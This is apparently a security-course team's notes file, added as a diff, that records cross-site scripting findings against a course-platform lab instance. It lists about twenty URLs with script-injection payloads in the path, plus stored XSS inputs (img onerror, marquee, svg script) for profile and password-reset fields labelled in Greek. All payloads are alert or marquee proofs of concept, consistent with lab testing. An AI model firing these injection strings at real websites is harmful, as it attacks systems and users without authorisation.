@@ -1,0 +1,42 @@
+------------------------------------------- CRISS
+
+http://kalashnik0v.csec.chatzi.org/index.php/%22%22%3E%3Cscript%3Ealert(1)%3C/script%3E
+http://kalashnik0v.csec.chatzi.org/modules/auth/courses.php/%22%22%3E%3Cscript%3Ealert(1)%3C/script%3E
+http://kalashnik0v.csec.chatzi.org/modules/agenda/myagenda.php/%22%22%3E%3Cscript%3Ealert(1)%3C/script%3E
+http://kalashnik0v.csec.chatzi.org/modules/profile/profile.php/%22%22%3E%3Cscript%3Ealert(1)%3C/script%3E
+http://kalashnik0v.csec.chatzi.org/modules/profile/personal_stats.php/%22%22%3E%3Cscript%3Ealert(1)%3C/script%3E
+http://kalashnik0v.csec.chatzi.org/manuals/manual.php/%22%22%3E%3Cscript%3Ealert(1)%3C/script%3E
+http://kalashnik0v.csec.chatzi.org/modules/auth/listfaculte.php/%22%22%3E%3Cscript%3Ealert(1)%3C/script%3E
+http://kalashnik0v.csec.chatzi.org/info/about.php/%22%22%3E%3Cscript%3Ealert(1)%3C/script%3E
+http://kalashnik0v.csec.chatzi.org/info/contact.php/%22%22%3E%3Cscript%3Ealert(1)%3C/script%3E
+http://kalashnik0v.csec.chatzi.org/modules/auth/opencourses.php/%22%22%3E%3Cscript%3Ealert(1)%3C/script%3E
+http://kalashnik0v.csec.chatzi.org/modules/search/search.php/%22%22%3E%3Cscript%3Ealert(1)%3C/script%3E
+http://kalashnik0v.csec.chatzi.org/modules/unreguser/unregcours.php/%22%22%3E%3Cscript%3Ealert(1)%3C/script%3E
+http://kalashnik0v.csec.chatzi.org/modules/auth/newprof.php/%22%22%3E%3Cscript%3Ealert(1)%3C/script%3E
+http://kalashnik0v.csec.chatzi.org/modules/learnPath/navigation/updateProgress.php/%22%22%3E%3Cscript%3Ealert(1)%3C/script%3E
+http://kalashnik0v.csec.chatzi.org/modules/admin/sysinfo/index.php/%22%22%3E%3Cscript%3Ealert(1)%3C/script%3E
+http://kalashnik0v.csec.chatzi.org/modules/phpbb/index.php/'%22%22%3E%3Cscript%3Ealert(1)%3C/script%3E.com
+http://kalashnik0v.csec.chatzi.org/modules/conference/messageList.php/'%22%22%3E%3Cscript%3Ealert(1)%3C/script%3E
+http://kalashnik0v.csec.chatzi.org/modules/auth/newuser.php/'%22%22%3E%3Cscript%3Ealert(1)%3C/script%3E.com
+http://kalashnik0v.csec.chatzi.org/modules/auth/contactprof.php/'%22%22%3E%3Cscript%3Ealert(1)%3C/script%3E.com
+http://kalashnik0v.csec.chatzi.org/modules/contact/index.php/'%22%22%3E%3Cscript%3Ealert(1)%3C/script%3E
+
+
+******* -> kalashnik0v.csec.chatzi.org/modules/learnPath/navigation/showExercise.php/%22%22%3E%3Cscript%3Ealert(1)%3C/script%3E
+
+
+Αλλαγή ονόματος
+--><!-- ---> <img src=xxx:x onerror=javascript:alert(1)> -->
+'">><marquee><h1>XSS</h1></marquee>
+
+Αλλαγή επιθέτου 
+'">><marquee><h1>XSS</h1></marquee>
+
+Αλλαγή email
+'">><marquee><h1>XSS</h1></marquee>
+
+Ξεχάσατε το συνθηματικό σας;
+Ονομα Χρήστη:
+TzeniPantazi<svg xmlns="#"><script>alert(1)</script></svg>
+------------------------------------------------------------
+------------------------------------------- THANOS
